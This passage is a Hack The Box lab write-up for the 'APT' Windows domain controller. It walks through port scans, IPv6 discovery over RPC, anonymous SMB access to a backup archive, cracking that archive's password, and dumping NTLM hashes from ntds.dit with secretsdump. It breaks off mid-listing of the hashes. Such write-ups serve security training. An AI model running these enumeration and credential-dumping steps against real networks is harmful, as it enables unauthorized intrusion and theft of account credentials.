---
title: APT
date: 2026-05-16
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - Nmap-analyzing-ipv6
  - Port53-DNS-Discovery-Host-ipv6
  - Port139-135-SMB-anonymous-login
  - Decode-zip-zip2john
  - Lateral-Movement-account-verify-hashes-wmiexec-psexec-smbexec-dcomexec-reg
  - Decode-ntds-SYSTEM-secretsdump
  - Port88-LDAP-Kerbrute-users-verify
  - Windows-Privilege-registry-enum
  - Windows-Privilege-powershell-history
  - windows
  - port88-ldap-getst
lastmod: 2026-06-12T02:29:07.590Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/apt" >}}

***

# Recon

### PORT & IP SCAN

summary the openport only with One-Paragraph -- AI

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.96.60 -oN serviceScan.txt

[sudo] password for parallels: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-16 11:19 +0800
Nmap scan report for 10.129.96.60
Host is up (0.21s latency).

PORT      STATE    SERVICE       VERSION
21/tcp    filtered ftp
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Gigantic Hosting | Home
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
3389/tcp  filtered ms-wbt-server
8080/tcp  filtered http-proxy
49668/tcp filtered unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.63 seconds

```

### Port 80 Web

![Pasted image 20260516175927.png](/ob/Pasted%20image%2020260516175927.png)

### Tech stack

{{< tech-stack >}}

OS: Windows\
Web Server: Apache/2.4.52\
Language: IIS 10.0\
Database: TBC\
Application: HTTrack Website Copier/3.x

{{< /tech-stack >}}

#### Ferobuster

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ feroxbuster -u http://10.129.96.60/         
                                                                                                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.96.60/
 🚩  In-Scope Url          │ 10.129.96.60
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      150c http://10.129.96.60/images => http://10.129.96.60/images/
301      GET        2l       10w      147c http://10.129.96.60/css => http://10.129.96.60/css/
301      GET        2l       10w      146c http://10.129.96.60/js => http://10.129.96.60/js/
200      GET      274l      958w    12146c http://10.129.96.60/clients.html
200      GET       21l       97w     7075c http://10.129.96.60/images/c-logo1.png
200      GET       23l      133w    10584c http://10.129.96.60/images/c-logo.png
200      GET       33l      144w    12681c http://10.129.96.60/images/c-logo5.png
200      GET      347l     1094w    14879c http://10.129.96.60/index.html
200      GET      155l      468w     6326c http://10.129.96.60/support.html
200      GET       24l      156w    11339c http://10.129.96.60/images/c-logo4.png
200      GET      357l      990w     8188c http://10.129.96.60/css/owl.carousel.css
200      GET      147l      412w     5528c http://10.129.96.60/news.html
200      GET       21l      187w    12696c http://10.129.96.60/images/logo.png
200      GET       23l      123w     9804c http://10.129.96.60/images/c-logo3.png
200      GET      211l      718w     9386c http://10.129.96.60/about.html
200      GET      243l      870w    10592c http://10.129.96.60/services.html
200      GET       33l      161w    11330c http://10.129.96.60/images/c-logo6.png
200      GET       50l      118w     1268c http://10.129.96.60/js/nav.js
200      GET     1470l     3315w    37908c http://10.129.96.60/js/owl.carousel.js
200      GET        4l       48w    17807c http://10.129.96.60/fonts/css/font-awesome.min.css
200      GET     1585l     3117w    28067c http://10.129.96.60/css/style.css
200      GET        4l     1421w    96381c http://10.129.96.60/js/jquery.min.js
301      GET        2l       10w      150c http://10.129.96.60/Images => http://10.129.96.60/Images/
200      GET     5785l    13825w   121276c http://10.129.96.60/css/bootstrap.css
200      GET      347l     1094w    14879c http://10.129.96.60/
301      GET        2l       10w      149c http://10.129.96.60/fonts => http://10.129.96.60/fonts/
403      GET       29l       92w     1233c http://10.129.96.60/fonts/
301      GET        2l       10w      153c http://10.129.96.60/fonts/css => http://10.129.96.60/fonts/css/
403      GET       29l       92w     1233c http://10.129.96.60/fonts/css/
301      GET        2l       10w      147c http://10.129.96.60/CSS => http://10.129.96.60/CSS/
403      GET       29l       92w     1233c http://10.129.96.60/fonts/fonts/
301      GET        2l       10w      155c http://10.129.96.60/fonts/fonts => http://10.129.96.60/fonts/fonts/
301      GET        2l       10w      153c http://10.129.96.60/fonts/CSS => http://10.129.96.60/fonts/CSS/
301      GET        2l       10w      146c http://10.129.96.60/JS => http://10.129.96.60/JS/
301      GET        2l       10w      146c http://10.129.96.60/Js => http://10.129.96.60/Js/
301      GET        2l       10w      147c http://10.129.96.60/Css => http://10.129.96.60/Css/
301      GET        2l       10w      153c http://10.129.96.60/fonts/Css => http://10.129.96.60/fonts/Css/
301      GET        2l       10w      150c http://10.129.96.60/IMAGES => http://10.129.96.60/IMAGES/
301      GET        2l       10w      149c http://10.129.96.60/Fonts => http://10.129.96.60/Fonts/
301      GET        2l       10w      153c http://10.129.96.60/Fonts/css => http://10.129.96.60/Fonts/css/
301      GET        2l       10w      155c http://10.129.96.60/fonts/Fonts => http://10.129.96.60/fonts/Fonts/
403      GET       29l       92w     1233c http://10.129.96.60/Fonts/Fonts/
301      GET        2l       10w      155c http://10.129.96.60/Fonts/fonts => http://10.129.96.60/Fonts/fonts/
301      GET        2l       10w      153c http://10.129.96.60/Fonts/CSS => http://10.129.96.60/Fonts/CSS/
301      GET        2l       10w      153c http://10.129.96.60/Fonts/Css => http://10.129.96.60/Fonts/Css/
301      GET        2l       10w      155c http://10.129.96.60/Fonts/Fonts => http://10.129.96.60/Fonts/Fonts/
400      GET        6l       26w      324c http://10.129.96.60/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/css/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/images/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/js/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/Images/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/fonts/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/fonts/css/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/CSS/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/fonts/fonts/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/fonts/CSS/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/JS/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/Css/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/Js/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/fonts/Css/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/IMAGES/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/Fonts/css/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/Fonts/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/Fonts/Fonts/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/fonts/Fonts/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/Fonts/fonts/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/Fonts/CSS/error%1F_log
400      GET        6l       26w      324c http://10.129.96.60/Fonts/Css/error%1F_log
[####################] - 3m    660085/660085  0s      found:68      errors:0      
[####################] - 2m     30000/30000   200/s   http://10.129.96.60/ 
[####################] - 2m     30000/30000   205/s   http://10.129.96.60/images/ 
[####################] - 2m     30000/30000   205/s   http://10.129.96.60/css/ 
[####################] - 2m     30000/30000   204/s   http://10.129.96.60/js/ 
[####################] - 2m     30000/30000   204/s   http://10.129.96.60/fonts/css/ 
[####################] - 2m     30000/30000   204/s   http://10.129.96.60/fonts/ 
[####################] - 2m     30000/30000   204/s   http://10.129.96.60/Images/ 
[####################] - 2m     30000/30000   204/s   http://10.129.96.60/fonts/fonts/ 
[####################] - 2m     30000/30000   205/s   http://10.129.96.60/CSS/ 
[####################] - 2m     30000/30000   204/s   http://10.129.96.60/fonts/CSS/ 
[####################] - 2m     30000/30000   205/s   http://10.129.96.60/JS/ 
[####################] - 2m     30000/30000   203/s   http://10.129.96.60/Js/ 
[####################] - 2m     30000/30000   205/s   http://10.129.96.60/Css/ 
[####################] - 2m     30000/30000   204/s   http://10.129.96.60/fonts/Css/ 
[####################] - 2m     30000/30000   204/s   http://10.129.96.60/IMAGES/ 
[####################] - 2m     30000/30000   205/s   http://10.129.96.60/Fonts/ 
[####################] - 2m     30000/30000   207/s   http://10.129.96.60/Fonts/css/ 
[####################] - 2m     30000/30000   206/s   http://10.129.96.60/Fonts/Fonts/ 
[####################] - 2m     30000/30000   206/s   http://10.129.96.60/fonts/Fonts/ 
[####################] - 2m     30000/30000   206/s   http://10.129.96.60/Fonts/fonts/ 
[####################] - 2m     30000/30000   206/s   http://10.129.96.60/Fonts/CSS/ 
[####################] - 2m     30000/30000   206/s   http://10.129.96.60/Fonts/Css/  
```

Nothing found

While do the brute-force , I will do the source-code review

The method I do for the web source-code review is that I will quickly view all comment , and do the link by firefox ctrl + f

![Pasted image 20260516180701.png](/ob/Pasted%20image%2020260516180701.png)

They do use the `HTTrack Website Copier/3.x` as the CMS ,and the user sales@gigantichosting.com, and the 10.13.38.16 is anothor IP

{{< toggle "Tag 🏷️" >}}

{{< tag "Port135-RPC-rpcmap.py-IOXIDResolver.py" >}} TCP 135 is the Endpoint Mapper and Component Object Model (COM) Service Control Manager. There’s a tool called  rpcmap.py from Impacket that will show these mappings. This tool needs a `stringbinding` argument to enable it’s connection. The examples from -h  are:

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ /usr/share/doc/python3-impacket/examples/rpcmap.py 'ncacn_ip_tcp:10.129.96.60'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Procotol: N/A
Provider: rpcss.dll
UUID: 00000136-0000-0000-C000-000000000046 v0.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1

Procotol: N/A
Provider: rpcss.dll
UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0

Protocol: [MS-RPCE]: Remote Management Interface
Provider: rpcrt4.dll
UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2

Procotol: N/A
Provider: rpcss.dll
UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0

Procotol: N/A
Provider: rpcss.dll
UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0

```

This scan provided a bunch of RPC endpoints with their UUIDs. The MS-DCOM ones are defined on [this page](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4). The one shown above is the RPC interface UUID for IObjectExporter, or the IOXIDResolver. This is know that is used for the [Potato exploits](https://2020.romhack.io/dl-2020/RH2020-slides-Cocomazzi.pdf). [This article](https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/) shows how to use this interface to get a list of network interfaces without auth.

There’s a POC script at the bottom (I added `()` around the print statement so it would work with modern Python), which I’ll grab and run:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ wget https://raw.githubusercontent.com/mubix/IOXIDResolver/refs/heads/main/IOXIDResolver.py
--2026-05-16 18:34:48--  https://raw.githubusercontent.com/mubix/IOXIDResolver/refs/heads/main/IOXIDResolver.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1312 (1.3K) [text/plain]
Saving to: ‘IOXIDResolver.py’

IOXIDResolver.py                                            100%[========================================================================================================================================>]   1.28K  --.-KB/s    in 0s      

2026-05-16 18:34:48 (40.2 MB/s) - ‘IOXIDResolver.py’ saved [1312/1312]

                                                                                                                                                                                                                                             
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ python3   IOXIDResolver.py -t 10.129.96.60                                                                       
[*] Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::4882:7176:bb9b:17af
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::158

```

### NMAP ipv6

{{< toggle "Tag 🏷️" >}}

{{< tag "Nmap-analyzing-ipv6" >}} With the IPv6 address, I’ll try nmap again, and there’s a bunch more open ports:

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nmap -6 -p- --min-rate 10000  dead:beef::b885:d62a:d679:573f 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-16 18:37 +0800
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.20s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49688/tcp open  unknown
51010/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.29 seconds




```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nmap -6 -p 53,80,88,135,389,445,464,593,636,3268,3269,5985,9389 -sCV -oA scans/nmap-tcpscripts-ipv6 dead:beef::b885:d62a:d679:573f
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 12:46 EDT
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.025s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-04-02 16:49:09Z)
135/tcp  open  msrpc        Microsoft Windows RPC
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:03+00:00; +2m44s from scanner time.
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:02+00:00; +2m43s from scanner time.
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:03+00:00; +2m44s from scanner time.
3269/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:02+00:00; +2m43s from scanner time.
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5m50s, deviation: 22m38s, median: 2m42s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: apt
|   NetBIOS computer name: APT\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System time: 2021-04-02T17:49:53+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-04-02T16:49:49
|_  start_date: 2021-04-02T15:21:15

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.64 seconds
```

### DNS

{{< toggle "Tag 🏷️" >}}

{{< tag "Port53-DNS-Discovery-Host-ipv6" >}} using nxc to discover the ipv6 's domain

{{< /toggle >}}

```
──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc smb dead:beef::b885:d62a:d679:573f  --generate-hosts-file  hosts                                          
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
                                                                                                                                                                                                                                             
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat hosts              
dead:beef::b885:d62a:d679:573f     APT.htb.local APT

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ ping -c1 APT.htb.local                    
PING APT.htb.local (dead:beef::b885:d62a:d679:573f) 56 data bytes
64 bytes from APT.htb.local (dead:beef::b885:d62a:d679:573f): icmp_seq=1 ttl=63 time=198 ms

--- APT.htb.local ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 198.057/198.057/198.057/0.000 ms
                                                           
```

### SMB

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-anonymous-login" >}} using the ipv6 as the target , the Guest dont successfully list the share , but the empty username is work on list the shares。

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  netexec smb dead:beef::b885:d62a:d679:573f   -u 'guest' -p '' --shares
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\guest: STATUS_ACCOUNT_DISABLED 
                                                                                                                                                                                                                                             
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  netexec smb dead:beef::b885:d62a:d679:573f   -u 'HAH' -p '' --shares
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\HAH: STATUS_LOGON_FAILURE 
                                                                                                                                                                                                                                             
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  netexec smb dead:beef::b885:d62a:d679:573f   -u '' -p '' --shares 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\: 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Enumerated shares
SMB         dead:beef::b885:d62a:d679:573f 445    APT              Share           Permissions     Remark
SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----           -----------     ------
SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ            
SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC
SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share 

```

There’s a share called `backup`. It contains a single file, `backup.zip`:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ smbclient -U ''%'' //dead:beef::b885:d62a:d679:573f/backup                                                                 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 24 15:30:52 2020
  ..                                  D        0  Thu Sep 24 15:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 15:30:32 2020

                5114623 blocks of size 4096. 2616251 blocks available
smb: \> 



```

{{< toggle "Tag 🏷️" >}}

{{< tag "Decode-zip-zip2john" >}} Discovering the backup.zip  and using the zip2john to create the hashes ,finally using the hashcat to decode the file .

{{< /toggle >}}

It required the password

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/APT]
└─$ unzip backup.zip                              
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password: 

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/APT]
└─$ zip2john backup.zip >backup.hash
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 type=8
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 type=8
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb type=8
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                            
                                                                                                                                                   
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/APT]
└─$ cat backup.hash 
backup.zip:$pkzip$4*1*1*0*8*24*9beb*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*65d9*2a1c4c81fb6009425c2d904699497b75d843f69f8e623e3edb81596de9e732057d17fae8*1*0*8*24*acd0*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, registry/SYSTEM, Active Directory/ntds.dit:backup.zip

```

That is very quick to show the password of `iloveyousomuch` to backup.zip

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/APT]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  backup.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)     
1g 0:00:00:00 DONE (2026-05-16 19:06) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

back to unzip it

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/APT]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] Active Directory/ntds.dit password: 
  inflating: Active Directory/ntds.dit  
  inflating: Active Directory/ntds.jfm  
   creating: registry/
  inflating: registry/SECURITY       
  inflating: registry/SYSTEM   
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Decode-ntds-SYSTEM-secretsdump" >}} Discovering the ntds ntds.dit  ntds.jfm ntds.dit from the backup file that is the Active Directory backup , also the registry 's SECURITY and SYSTEM is helpful to use the secretsdump get the user and hashes

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/APT]
└─$ /usr/share/doc/python3-impacket/examples/secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > backup_ad_dump


```

`secretsdump.py` will take the System hive and the `ntds.dit` file and dump that hashes. There are a ton of them.

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/APT]
└─$ head -n 120 backup_ad_dump 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 1733ad403c773dde94dddffa2292ffe9
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211:::
jeb.sloan:3200:aad3b435b51404eeaad3b435b51404ee:9ea25adafeec63e38cef4259d3b15c30:::
ranson.mejia:3201:aad3b435b51404eeaad3b435b51404ee:3ae49ec5e6fed82ceea0dc2be77750ab:::
unice.daugherty:3202:aad3b435b51404eeaad3b435b51404ee:531c98e26cfa3caee2174af495031187:::
kazuo.deleon:3203:aad3b435b51404eeaad3b435b51404ee:fde29e6cb61b4f7fda1ad5cd2759329d:::
dacy.frederick:3204:aad3b435b51404eeaad3b435b51404ee:51d368765462e9c5aebc456946d8dc86:::
emeline.boone:3205:aad3b435b51404eeaad3b435b51404ee:273c48fb014f8e5bf9e2918e3bf7bfbd:::
baris.martin:3206:aad3b435b51404eeaad3b435b51404ee:98590500f99a1bee7559e97ad342d995:::
mea.cash:3207:aad3b435b51404eeaad3b435b51404ee:10cf01167854082e180cf549f63c0285:::
elie.petersen:3208:aad3b435b51404eeaad3b435b51404ee:813f9d0988b9242eec1e45907344b591:::
gaylene.stephenson:3209:aad3b435b51404eeaad3b435b51404ee:6149000a4f3f7c57642cbee1ea70c3e1:::
rodrigo.cannon:3210:aad3b435b51404eeaad3b435b51404ee:f225672e2ce8192cafe0145842b28e14:::
fawnia.baldwin:3211:aad3b435b51404eeaad3b435b51404ee:d7d8f549bc7c89be8596ffa3c177548d:::
kizzy.holland:3212:aad3b435b51404eeaad3b435b51404ee:778df07e2d1405854b08f0477d8278c1:::
gretna.carroll:3213:aad3b435b51404eeaad3b435b51404ee:62a7c0ae9826573f70d7839658cc53e8:::
